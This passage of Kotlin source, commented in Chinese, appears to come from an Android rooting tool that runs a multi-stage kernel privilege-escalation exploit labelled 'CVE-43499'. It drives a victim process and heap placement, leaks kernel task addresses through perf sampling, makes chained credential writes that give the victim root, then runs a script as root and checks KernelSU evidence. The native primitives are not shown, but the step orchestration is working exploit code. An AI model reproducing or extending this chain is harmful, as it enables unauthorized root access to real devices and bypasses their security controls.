     * B6：finish 派发前有界 settle + module/enforce 有界轮询。
     *
     * @param run 本次运行状态。
     * @return null=可派发；非 null=具名失败（settle 配置非法/中断）。
     * @note settle 默认 2000ms（debug 可配）；轮询 ≤20×50ms（有界）；证据
     *   finishEnforceBefore/After/moduleState/settleMs/pollAttempts 写入 run.writeEvidence。
     */
    private fun finishPreDispatchSettle(run: Cve43499FlowRunState): StepResult? {
        val settleMs = run.runSpec.finishPreDispatchSettleMs
        if (settleMs < 0L || settleMs > 10_000L) {
            return StepResult.Failed("cve43499:finish.execute:settle-invalid")
        }
        run.finishEnforceBefore = run.runSpec.finishEnforceReader()
        run.writeEvidence["finishPreDispatchSettleMs"] = settleMs.toString()
        run.writeEvidence["finishEnforceBefore"] = run.finishEnforceBefore?.toString() ?: "missing"
        if (settleMs > 0L) {
            try {
                run.runSpec.finishSleeper(settleMs)
            } catch (interrupted: InterruptedException) {
                Thread.currentThread().interrupt()
                return StepResult.Failed("cve43499:finish.execute:settle-interrupted")
            }
        }
        var attempts = 0
        var moduleState = "unknown"
        while (attempts < 20) {
            attempts++
            moduleState = run.runSpec.finishModuleStateReader()
            val enforce = run.runSpec.finishEnforceReader()
            if (enforce != null) {
                run.finishEnforceAfter = enforce
                break
            }
            run.runSpec.finishSleeper(50L)
        }
        run.writeEvidence["finishModuleState"] = moduleState
        run.writeEvidence["finishEnforceAfter"] = run.finishEnforceAfter?.toString() ?: "missing"
        run.writeEvidence["finishEnforcePollAttempts"] = attempts.toString()
        return null
    }

    private fun finishExecuteViaVictim(run: Cve43499FlowRunState): StepResult {
        val handoff = run.runSpec.handoff
        /* 脚本对象身份：磁盘字节必须仍是 handoff 冻结的同一个对象。 */
        val scriptBytes = evidenceSource.readBytes(handoff.scriptPath)
            ?: return StepResult.Failed("cve43499:finish.execute:script-missing")
        if (scriptBytes.size != handoff.scriptSizeBytes) {
            return StepResult.Failed("cve43499:finish.execute:script-size-mismatch")
        }
        val observedSha = runCatching { FinishHandoff.sha256Hex(scriptBytes) }.getOrNull()
        if (observedSha == null || observedSha != handoff.scriptSha256Hex) {
            return StepResult.Failed("cve43499:finish.execute:script-sha-mismatch")
        }
        val timeoutMs = run.runSpec.finishTimeoutMs
        if (timeoutMs <= 0L) {
            return StepResult.Failed("cve43499:finish.execute:timeout-invalid")
        }
        finishPreDispatchSettle(run)?.let { return it }
        return when (val result = run.lifecycle.victimFinish(handoff.scriptPath, timeoutMs)) {
            is VictimFinishResult.Ok -> {
                val execution = FinishExecutionEvidence(
                    runId = run.runId,
                    exitCode = result.exitCode,
                    timedOut = result.timedOut,
                    outputDigestSha256 = result.outputSha256,
                    successMarkerContent = readMarker(FinishAcceptance.SUCCESS_MARKER_PATH),
                    failureMarkerContent = readMarker(FinishAcceptance.FAILURE_MARKER_PATH),
                )
                run.execution = execution
                run.writeEvidence[EVIDENCE_FINISH_SOURCE] = FINISH_SOURCE_VICTIM
                run.writeEvidence[EVIDENCE_EXECUTION_TIMED_OUT] = result.timedOut.toString()
                run.writeEvidence[EVIDENCE_EXECUTION_OUTPUT_SHA] = result.outputSha256
                val sha = result.outputSha256.take(12)
                run.info("finish ok")
                run.debug(
                    "finish source=victim exit=" + result.exitCode +
                        " timedOut=" + result.timedOut + " sha=" + sha,
                )
                StepResult.Done(
                    linkedMapOf(
                        EVIDENCE_EXECUTION_EXIT to result.exitCode.toString(),
                        EVIDENCE_FINISH_SOURCE to FINISH_SOURCE_VICTIM,
                        EVIDENCE_EXECUTION_TIMED_OUT to result.timedOut.toString(),
                        EVIDENCE_EXECUTION_OUTPUT_SHA to result.outputSha256,
                    ),
                )
            }
            is VictimFinishResult.Failed -> {
                if (result.retained) {
                    run.writeEvidence[EVIDENCE_VICTIM_RETAINED] = "true"
                    StepResult.Failed(
                        "cve43499:finish.execute:victim:" + result.reason,
                        linkedMapOf(EVIDENCE_VICTIM_RETAINED to "true"),
                    )
                } else {
                    StepResult.Failed("cve43499:finish.execute:victim:" + result.reason)
                }
            }
        }
    }

    /**
     * 读取一个 marker 文件的文本内容（证据源可注入）。
     *
     * @param path 绝对路径。
     * @return trim 后的内容；不存在/不可读返回 null。
     */
    private fun readMarker(path: String): String? = runCatching {
        evidenceSource.readBytes(path)?.decodeToString()?.trim()
    }.getOrNull()

    /**
     * 终结整链 step（两种模式共享；cleanup() 兜底同一入口）。
     *
     * @param run 本次运行状态。
     * @return Done（termination/resourcesReleased/retained）。
     */
    private fun lifecycleCloseStep(run: Cve43499FlowRunState): StepResult {
        val receipt: Cve43499LifecycleReceipt = run.lifecycle.closeAll()
        run.closed = true
        run.termination = receipt.termination
        run.resourcesReleased = receipt.allReleased
        run.retainedResources = receipt.retained
        run.rootedChildParked = receipt.parkedRootedChild
        run.openChains = 0
        /* G01：非 rooted-child-parked 的 retained ⇒ evidence 后 fail-stop。 */
        if (receipt.retained && !receipt.parkedRootedChild) {
            triggerFailStop(run, "lifecycle.close", receipt.termination)
        }
        /* B1⑦：W2 cred 写成功后 closeAll 聚合 retained ⇒ 仍以统一 token 失败，
         * 禁止 acceptance（closeAll 只作兜底，不挽救已坏窗口）。 */
        if (run.w2CredWriteSucceeded &&
            (receipt.retained || !receipt.allReleased) &&
            !receipt.parkedRootedChild
        ) {
            markRetained(run, "write.w2.close-all", "close-all-retained:" + receipt.termination)
            return StepResult.Failed(W2_CLOSE_RETAINED_TOKEN, closeContractEvidence(run))
        }
        run.info("close ok")
        run.debug(
            "close termination=" + receipt.termination +
                " released=" + receipt.allReleased +
                " retained=" + receipt.retained +
                " parkedRooted=" + receipt.parkedRootedChild,
        )
        return StepResult.Done(
            linkedMapOf(
                EVIDENCE_TERMINATION to receipt.termination,
                EVIDENCE_RESOURCES_RELEASED to receipt.allReleased.toString(),
                EVIDENCE_RETAINED to retainedToken(receipt.retained, receipt.parkedRootedChild),
                EVIDENCE_ROOTED_CHILD_PARKED to receipt.parkedRootedChild.toString(),
            ).apply { putAll(run.writeEvidence) },
        )
    }

    /**
     * 收尾验收 step：构建绑定证据 + 六项判定，把 verdict 映射成 Done/Failed。
     *
     * @param run 本次运行状态（要求 close step 已完成，resourcesReleased 已确定）。
     * @return Accepted ⇒ Done；Refused ⇒ Failed（具名 reasons + 完整 evidence）。
     */
    private fun acceptanceStep(run: Cve43499FlowRunState): StepResult {
        val binding: RunBindingEvidence? = buildBinding(run)
        val verdict = FinishAcceptance.evaluate(
            FinishAcceptanceInput(
                runId = run.runId,
                observedUid = run.observedUid,
                handoff = run.runSpec.handoff,
                resourcesReleased = run.resourcesReleased,
                execution = run.execution,
                binding = binding,
                source = evidenceSource,
                commandSource = commandSource,
                expectedUid = run.runSpec.expectedUid,
                enforceBefore = run.finishEnforceBefore,
                enforceAfter = run.finishEnforceAfter ?: run.runSpec.finishEnforceReader(),
            ),
        )
        val receipts = receipts(run, verdict)
        return when (verdict) {
            FinishVerdict.Accepted -> StepResult.Done(evidence(receipts))
            is FinishVerdict.Refused -> StepResult.Failed(
                "cve43499:acceptance:" + verdict.reasons.joinToString(","),
                evidence(receipts),
            )
        }
    }

    /**
     * 构造 victim ↔ Actor 的可审计绑定证据（原始字段来自 lifecycle 的 snapshot）。
     *
     * @param run 本次运行状态。
     * @return 绑定证据；任一侧缺失返回 null（验收按 `finish-binding-missing` 拒绝）。
     */
    private fun buildBinding(run: Cve43499FlowRunState): RunBindingEvidence? {
        val before = run.victimBefore ?: return null
        val after = run.victimAfter ?: return null
        val uid = run.observedUid ?: return null
        /* 绑定证据必须用实际送入 Actor 的 primitive：
         * - 多写链：W2 凭据写的 primitive（真正 root victim 的那次写）；
         * - 单 W1：post-placement 生成值 / 冻结兼容输入。 */
        val primitive = run.bindingPrimitive
            ?: run.generatedPrimitive
            ?: run.runSpec.frozenInputs?.primitive
            ?: return null
        return runBindingEvidence(
            runId = run.runId,
            victimPid = before.pid,
            victimUid = uid,
            victimStartTimeTicksBefore = before.startTimeTicks,
            victimStartTimeAfterExecute = after.startTimeTicks,
            primitiveWaiterAddress = primitive.finalWaiterAddress,
            primitiveTaskAddress = primitive.finalTaskAddress,
            primitiveLockAddress = primitive.finalLockAddress,
        )
    }

    /* ==================================================================== */
    /* 多写链状态与证据工具                                                  */
    /* ==================================================================== */

    /**
     * 记录一次成功事务（链保持打开）。
     *
     * @param run 本次运行状态。
     * @param primitive 本次事务实际绑定的 Carrier（当前链的代表值）。
     */
    private fun markExecuted(run: Cve43499FlowRunState, primitive: Native43499PrimitiveSpec) {
        run.openChains++
        run.generatedPrimitive = primitive
    }

    /**
     * 记录一条被 Native 保留的链（dirty）。
     *
     * @param run 本次运行状态。
     */
    /**
     * 标记 retained/dirty 并触发 G01 fail-stop（evidence 先、终止后、只一次）。
     *
     * @param run 本次运行状态。
     * @param stage 阶段 token（`write.w1` 等；用于 reason）。
     * @param reason 触发 retained 的具名原因。
     */
    private fun markRetained(
        run: Cve43499FlowRunState,
        stage: String = "retained",
        reason: String = "retained",
    ) {
        run.openChains++
        run.retainedResources = true
        run.writeEvidence[EVIDENCE_RETAINED] = "true"
        triggerFailStop(run, stage, reason)
    }

    /**
     * @param run 本次运行状态。
     * @return 本次 run 的 fail-stop 控制器（lazy；evidence sink 合并到 run.writeEvidence）。
     */
    private fun failStopController(run: Cve43499FlowRunState): FailStopController {
        run.failStop?.let { return it }
        val controller = FailStopController(
            enabled = run.runSpec.failStopEnabled,
            terminator = run.runSpec.failStopTerminator
                ?: FailStopController.DEFAULT_TERMINATOR,
            evidenceSink = { evidence ->
                run.writeEvidence.putAll(evidence)
                run.runSpec.failStopEvidenceSink?.invoke(evidence)
            },
        )
        run.failStop = controller
        return controller
    }

    /**
     * 触发一次 fail-stop（控制器保证只一次；未启用时 no-op）。
     *
     * @param run 本次运行状态。
     * @param stage 阶段 token。
     * @param reason retained 的具名原因。
     */
    private fun triggerFailStop(
        run: Cve43499FlowRunState,
        stage: String,
        reason: String,
    ) {
        /* fail-stop 行先落日志/证据（enabled=0 时 trigger 内部 no-op，但行仍发出）。 */
        run.error("fail-stop", "stage=" + stage + " reason=" + reason + " coldRebootRequired=true")
        failStopController(run).trigger(stage = stage, retainedReason = reason)
    }

    /**
     * 关闭最新一条写链；保留闭包（retained）计入证据。
     *
     * @param run 本次运行状态。
     * @return 单链 close 回执。
     */
    private fun closeLatestChain(run: Cve43499FlowRunState): Cve43499ChainCloseReceipt {
        if (run.openChains > 0) run.openChains--
        val receipt = run.lifecycle.closeChain()
        if (receipt.retained) {
            run.retainedResources = true
            run.writeEvidence[EVIDENCE_RETAINED] = "true"
            triggerFailStop(run, "lifecycle.close-chain", receipt.termination)
        }
        return receipt
    }

    /**
     * @param run 本次运行状态。
     * @return 失败 evidence（dirty 时带 retained 标记）。
     */
    private fun retainedEvidence(run: Cve43499FlowRunState): Map<String, String> =
        if (run.retainedResources) {
            linkedMapOf(EVIDENCE_RETAINED to "true")
        } else {
            emptyMap()
        }

    /** @return 多写链缺失的共享失败结果。 */
    private fun missingChain(): StepResult =
        StepResult.Failed("cve43499:write-chain:missing")

    /** @return 写事务执行器缺失的共享失败结果。 */
    private fun missingRunner(): StepResult =
        StepResult.Failed("cve43499:write-chain:runner-missing")

    /**
     * 捕获采样前 victim 身份基线（R3e-2/R2）。
     *
     * @param run 本次运行状态。
     * @return 基线；victim 未启动/身份读取失败返回 null（W2 具名 fail-closed）。
     */
    private fun captureVictimBaseline(run: Cve43499FlowRunState): Cve43499VictimBaseline? {
        val snapshot = run.lifecycle.victimSnapshot() ?: return null
        return Cve43499VictimBaseline(
            pid = snapshot.pid,
            startTimeTicks = snapshot.startTimeTicks,
            uidProbe = snapshot.uid,
        )
    }

    /**
     * 在 perf 采样窗口内驱动 victim 执行内核态代码（复用既有 uid probe 流）。
     *
     * @param run 本次运行状态（victim 会话由 lifecycle 唯一管理）。
     * @param iterations 要发起的 `probe→id -u` 次数（debug 配置给值）。
     * @param budgetNanos 墙钟预算（纳秒；≤0 不启用显式预算）。
     * @return null=完成；否则具名失败原因（`pump-*`/`victim-probe-failed:*`）。
     * @note 不改 victim 协议/代码；每次 probe 仍由既有 session 有界超时保护。
     */
    private fun pumpVictim(
        run: Cve43499FlowRunState,
        iterations: Long,
        budgetNanos: Long,
    ): String? {
        if (iterations <= 0L) return "pump-iterations-invalid"
        val startNanos = System.nanoTime()
        var done = 0L
        while (done < iterations) {
            if (budgetNanos > 0L &&
                System.nanoTime() - startNanos > budgetNanos
            ) {
                return "pump-budget-exceeded"
            }
            val probe = run.lifecycle.victimUid()
            if (probe.uid == null) {
                return "victim-probe-failed:" + (probe.failureReason ?: "unknown")
            }
            done++
        }
        return null
    }

    /**
     * W2 uid 前置校验（H1-a/R2）：身份不变、uid 基线非 0 且未变、证据可信。
     *
     * @param run 本次运行状态。
     * @param acquired 取址结局（地址+采样时基线/证据）。
     * @return null=通过；否则具名子原因（Flow 拼 `w2-precheck:` 前缀）。
     */
    private fun w2Precheck(
        run: Cve43499FlowRunState,
        acquired: Cve43499TargetAcquisition.Acquired,
    ): String? {
        val evidence = acquired.evidence
        val snapshot = run.lifecycle.victimSnapshot()
            ?: return "victim-identity-changed"
        if (snapshot.pid != evidence.baseline.pid ||
            snapshot.startTimeTicks != evidence.baseline.startTimeTicks
        ) {
            return "victim-identity-changed"
        }
        val baselineUid = evidence.baseline.uidProbe
            ?: return "uid-baseline-unexpected"
        if (baselineUid == 0L || snapshot.uid != baselineUid) {
            return "uid-baseline-unexpected"
        }
        if (!evidence.trusted() || acquired.victimTaskAddress == 0L) {
            return "target-untrusted"
        }
        return null
    }

    /**
     * 把 acquisition 的解析/投票事实写入 evidence（可证伪；不含成功主张）。
     *
     * @param run 本次运行状态。
     * @param evidence 目标证据。
     */
    private fun recordTargetEvidence(
        run: Cve43499FlowRunState,
        evidence: Cve43499TargetEvidence,
    ) {
        run.writeEvidence[EVIDENCE_PERF_PASSES] = evidence.passes.toString()
        run.writeEvidence[EVIDENCE_PERF_PASS_ADDRESSES] =
            evidence.passAddresses.joinToString(",") { formatAddress(it) }
        run.writeEvidence[EVIDENCE_PERF_VOTES] = evidence.votes.toString()
        run.writeEvidence[EVIDENCE_PERF_CANDIDATES] = evidence.candidates.toString()
        run.writeEvidence[EVIDENCE_PERF_THRESHOLD] = evidence.threshold.toString()
        run.writeEvidence[EVIDENCE_PERF_ALIGNMENT_OK] =
            evidence.alignmentOk.toString()
        run.writeEvidence[EVIDENCE_PERF_SP_OK] = evidence.spEvidenceOk.toString()
        run.writeEvidence[EVIDENCE_PERF_CLOSE_RETAINED] =
            evidence.closeRetained.toString()
    }

    /**
     * 有界等待（setup settle/attempt 退避；0 不等待）。
     *
     * @param micros 微秒；≤0 立即返回。
     */
    private suspend fun settleUs(micros: Long) {
        if (micros <= 0L) return
        delay((micros / 1000L).coerceAtLeast(1L))
    }

    /**
     * retained evidence token：Native 保留闭包与 rooted child 驻留互斥表达。
     *
     * @param retained Native 是否有保留闭包（dirty）。
     * @param rootedChildParked rooted victim 是否按 task-45 只 detach。
     * @return `rooted-child-parked` / `true` / `false`。
     */
    private fun retainedToken(retained: Boolean, rootedChildParked: Boolean): String = when {
        rootedChildParked -> ROOTED_CHILD_PARKED
        else -> retained.toString()
    }

    /**
     * 把地址格式化成稳定可检索的 16 位十六进制（evidence 用）。
     *
     * @param address Native 回传地址。
     * @return `0x` + 零填充 16 位十六进制。
     * @note 不用 `String.format`（避免 Locale/分配差异）；纯字符串拼接。
     */
    private fun formatAddress(address: Long): String {
        val hex = java.lang.Long.toHexString(address)
        return "0x" + "0".repeat(16 - hex.length) + hex
    }

    /**
     * @param run 本次运行状态。
     * @param verdict 验收结论。
     * @return 物理事实回执（evidence 用）。
     */
    private fun receipts(
        run: Cve43499FlowRunState,
        verdict: FinishVerdict,
    ): Cve43499RunReceipts = Cve43499RunReceipts(
        runId = run.runId,
        placementRounds = run.placementRounds,
        landingReclaimSends = run.landingReclaimSends,
        actorConsumerSuccess = run.actorConsumerSuccess,
        victimUid = run.observedUid,
        victimStartTimeTicks = run.victimBefore?.startTimeTicks,
        executionExitCode = run.execution?.exitCode,
        termination = run.termination,
        verdict = verdict,
        writeEvidence = run.writeEvidence.toMap(),
        retained = run.retainedResources,
        rootedChildParked = run.rootedChildParked,
    )

    /**
     * 把物理回执映射成 step evidence（全部字符串；不改判定语义）。
     *
     * @param receipts 物理事实与收尾验收结论。
     * @return 稳定 key 的 evidence：runId/verdict/reasons/uid/termination/计数/写链证据。
     */
    private fun evidence(receipts: Cve43499RunReceipts): Map<String, String> {
        val evidence = linkedMapOf<String, String>()
        evidence[EVIDENCE_RUN_ID] = receipts.runId
        evidence[EVIDENCE_VERDICT] = when (val verdict = receipts.verdict) {
            FinishVerdict.Accepted -> VERDICT_ACCEPTED
            is FinishVerdict.Refused -> {
                evidence[EVIDENCE_REASONS] = verdict.reasons.joinToString(",")
                VERDICT_REFUSED
            }
        }
        evidence[EVIDENCE_UID] = receipts.victimUid?.toString() ?: VALUE_MISSING
        evidence[EVIDENCE_TERMINATION] = receipts.termination
        evidence[EVIDENCE_PLACEMENT_ROUNDS] = receipts.placementRounds.toString()
        evidence[EVIDENCE_LANDING_RECLAIM_SENDS] =
            receipts.landingReclaimSends.toString()
        evidence[EVIDENCE_ACTOR_CONSUMER_SUCCESS] =
            receipts.actorConsumerSuccess.toString()
        evidence[EVIDENCE_RETAINED] =
            retainedToken(receipts.retained, receipts.rootedChildParked)
        if (receipts.rootedChildParked) {
            evidence[EVIDENCE_ROOTED_CHILD_PARKED] = "true"
        }
        receipts.victimStartTimeTicks?.let {
            evidence[EVIDENCE_VICTIM_STARTTIME] = it.toString()
        }
        receipts.executionExitCode?.let {
            evidence[EVIDENCE_EXECUTION_EXIT] = it.toString()
        }
        evidence.putAll(receipts.writeEvidence)
        return evidence
    }

    /**
     * 构造一个默认 policy 的命名 step（攻击步骤不自动重试；无超时/延时）。
     *
     * @param name step 名。
     * @param block step 主体。
     * @return FlowStep（RetryPolicy()/StepTiming() 默认）。
     */
    /** 运行 id 只显示尾 8 位（脱敏）。 */
    private fun shortRunId(runId: String): String = runId.takeLast(8).ifBlank { "-" }

    /** step 名去前缀，日志只用短 token。 */
    private fun shortStepName(name: String): String = name.removePrefix("cve43499.")

    private fun step(
        name: String,
        block: suspend (StepContext) -> StepResult,
    ): FlowStep = FlowStep(
        name = name,
        retry = RetryPolicy(),
        timing = StepTiming(),
    ) { context ->
        val result = block(context)
        /* task-101：失败仅在此处统一记一条（clean=Warn/retained=Error）；成功里程碑由各 step 内部记。 */
        if (result is StepResult.Failed) {
            activeRun?.let { run ->
                val stage = shortStepName(name)
                val reason = result.reason.ifBlank { "unspecified" }
                if (run.retainedResources) {
                    run.error("stage=" + stage + " failed", reason)
                } else {
                    run.warn("stage=" + stage + " failed", reason)
                }
            }
        }
        result
    }

    /** 收尾验收证据源（物理事实；可在宿主验证中注入）。 */
    private val evidenceSource: FinishEvidenceSource = AndroidFinishEvidenceSource

    /** ksud 证据的有界命令 seam。 */
    private val commandSource: FinishCommandSource = ProcessBuilderFinishCommandSource

    private companion object {
        /** 每步名称（与 eval/report 对齐）。 */
        const val STEP_LEGACY: String = "cve43499.not-wired"
        const val STEP_RUN_REQUEST: String = "cve43499.run-request"
        const val STEP_REQUEST_VALIDATE: String = "cve43499.request.validate"
        const val STEP_VICTIM_START: String = "cve43499.victim.start"
        const val STEP_PLACEMENT_PREPARE: String = "cve43499.placement.prepare"
        const val STEP_PAGE_LAND: String = "cve43499.page.land"
        const val STEP_ACTOR_PREPARE: String = "cve43499.actor.prepare"
        const val STEP_ACTOR_EXECUTE: String = "cve43499.actor.execute"
        const val STEP_WRITE_W1: String = "cve43499.write.w1"
        const val STEP_WRITE_W1B: String = "cve43499.write.w1b"
        const val STEP_WRITE_W2: String = "cve43499.write.w2"
        const val STEP_WRITE_W3: String = "cve43499.write.w3"
        const val STEP_VICTIM_PROBE: String = "cve43499.victim.probe"
        const val STEP_FINISH_EXECUTE: String = "cve43499.finish.execute"
        const val STEP_LIFECYCLE_CLOSE: String = "cve43499.lifecycle.close"
        const val STEP_ACCEPTANCE: String = "cve43499.acceptance"

        /** 历史请求形状的 fail-closed reason（与既有测试冻结的字符串一致）。 */
        const val REASON_LEGACY_NOT_WIRED: String = "cve43499-flow-not-wired"

        /** run 输入缺失的具名 reason。 */
        const val REASON_RUN_REQUEST_MISSING: String = "cve43499-run-request-missing"

        const val EVIDENCE_RUN_ID: String = "runId"
        const val EVIDENCE_VERDICT: String = "verdict"
        const val EVIDENCE_REASONS: String = "reasons"
        const val EVIDENCE_UID: String = "uid"
        const val EVIDENCE_TERMINATION: String = "termination"
        const val EVIDENCE_RESOURCES_RELEASED: String = "resourcesReleased"
        const val EVIDENCE_RETAINED: String = "retained"
        const val EVIDENCE_PLACEMENT_ROUNDS: String = "placementRounds"
        const val EVIDENCE_LANDING_RECLAIM_SENDS: String = "landingReclaimSends"
        const val EVIDENCE_ACTOR_CONSUMER_SUCCESS: String = "actorConsumerSuccess"
        const val EVIDENCE_ACTOR_PRIMITIVE_KIND: String = "actorPrimitiveKind"
        const val EVIDENCE_CANDIDATE_PAGE_BASE: String = "candidatePageBase"
        const val EVIDENCE_LANDING_SOURCE: String = "landingSource"
        const val LANDING_SOURCE_POST_PLACEMENT: String = "post-placement"
        const val LANDING_SOURCE_FROZEN: String = "frozen"
        const val EVIDENCE_VICTIM_STARTTIME: String = "victimStartTimeTicks"
        const val EVIDENCE_EXECUTION_EXIT: String = "executionExitCode"
        const val EVIDENCE_WRITE_MODE: String = "writeMode"
        const val WRITE_MODE_SINGLE: String = "single-w1"
        const val WRITE_MODE_CHAIN: String = "write-chain"
        const val EVIDENCE_PRIMITIVE: String = "primitive"
        const val EVIDENCE_KSU_GUARD: String = "ksuGuard"
        const val EVIDENCE_VICTIM_RETAINED: String = "victimRetained"
        const val EVIDENCE_W3_GATE: String = "w3Gate"
        const val EVIDENCE_W3_FAIL_REASON: String = "w3FailReason"
        const val EVIDENCE_W3_COLD_REBOOT: String = "w3ColdRebootRequired"
        /* G05 prebuilt repair 证据（append-only；默认关闭时不写）。 */
        const val EVIDENCE_W2_REPAIR_MODE: String = "w2RepairMode"
        const val EVIDENCE_W2_REPAIR_US: String = "w2RepairUs"
        const val EVIDENCE_W2_REPAIR_ACTIVATION_US: String = "w2RepairActivationUs"
        const val EVIDENCE_W2_REPAIR_EXECUTE_US: String = "w2RepairExecuteUs"
        const val EVIDENCE_W2_REPAIR_CLOSE_US: String = "w2RepairCloseUs"
        const val EVIDENCE_PREBUILD_US: String = "prebuildUs"
        const val EVIDENCE_PREBUILT_STATE: String = "prebuiltState"
        const val EVIDENCE_W2_REPAIRS: String = "w2Repairs"
        const val EVIDENCE_W2_ATTEMPTS: String = "w2Attempts"
        const val EVIDENCE_W2_UID: String = "w2Uid"
        /* G05 值 token。 */
        const val W2_REPAIR_MODE_NONE: String = "none"
        const val W2_REPAIR_MODE_PREBUILT: String = "prebuilt"
        const val W2_REPAIR_MODE_FULL_FALLBACK: String = "full-fallback"
        const val W2_REPAIR_MODE_PREBUILD_CLEAN_FAILED: String = "prebuild-clean-failed"
        const val PREBUILT_STATE_PAGE_READY: String = "page-ready"
        const val PREBUILT_STATE_CLEAN_FAILED: String = "clean-failed"
        const val PREBUILT_STATE_RETAINED: String = "retained"
        const val W2_CLOSE_RETAINED_TOKEN: String = "cve43499:write.w2:fast-repair-close-retained"
        const val EVIDENCE_KSU_SIGNAL: String = "ksuSignal"
        const val EVIDENCE_W1_ATTEMPTS: String = "w1Attempts"
        const val EVIDENCE_W1_CARRIER: String = "w1Carrier"
        const val EVIDENCE_W1_VERIFY: String = "w1Verify"
        const val EVIDENCE_W1_VERIFY_REASON: String = "w1VerifyReason"
        const val W1_VERIFY_VERIFIED: String = "verified"
        const val W1_VERIFY_UNVERIFIED: String = "unverified"
        const val W1_VERIFY_UNSUPPORTED: String = "unsupported"
        const val EVIDENCE_FINISH_SOURCE: String = "finishSource"
        const val FINISH_SOURCE_VICTIM: String = "victim"
        const val EVIDENCE_EXECUTION_TIMED_OUT: String = "executionTimedOut"
        const val EVIDENCE_EXECUTION_OUTPUT_SHA: String = "executionOutputSha256"
        const val EVIDENCE_ROOTED_CHILD_PARKED: String = "rootedChildParked"
        const val ROOTED_CHILD_PARKED: String = "rooted-child-parked"
        const val EVIDENCE_W1B_STATE: String = "w1bState"
        const val EVIDENCE_W1B_WRITES: String = "w1bWrites"
        const val EVIDENCE_W3_ROUNDS: String = "w3Rounds"
        const val EVIDENCE_W3_ATTEMPTS: String = "w3Attempts"
        const val EVIDENCE_W3_LEAF_DIRECTION: String = "w3LeafDirection"
        const val EVIDENCE_VICTIM_TASK: String = "victimTaskAddress"
        const val EVIDENCE_W2_PRECHECK: String = "w2Precheck"
        const val EVIDENCE_PERF_PASSES: String = "perfPasses"
        const val EVIDENCE_PERF_PASS_ADDRESSES: String = "perfPassAddresses"
        const val EVIDENCE_PERF_VOTES: String = "perfAgreeVotes"
        const val EVIDENCE_PERF_CANDIDATES: String = "perfAgreeCandidates"
        const val EVIDENCE_PERF_THRESHOLD: String = "perfThreshold"
        const val EVIDENCE_PERF_ALIGNMENT_OK: String = "perfAlignmentOk"
        const val EVIDENCE_PERF_SP_OK: String = "perfSpEvidenceOk"
        const val EVIDENCE_PERF_CLOSE_RETAINED: String = "perfCloseRetained"
        const val W1B_REPAIRED: String = "repaired"
        const val W1B_SKIPPED_ROUTE: String = "skipped-route"
        const val LEAF_EXACT: String = "exact"
        const val LEAF_TARGET_PLUS_8: String = "target-plus-8"
        const val VERDICT_ACCEPTED: String = "accepted"
        const val VERDICT_REFUSED: String = "refused"
        const val VALUE_MISSING: String = "missing"
    }
}
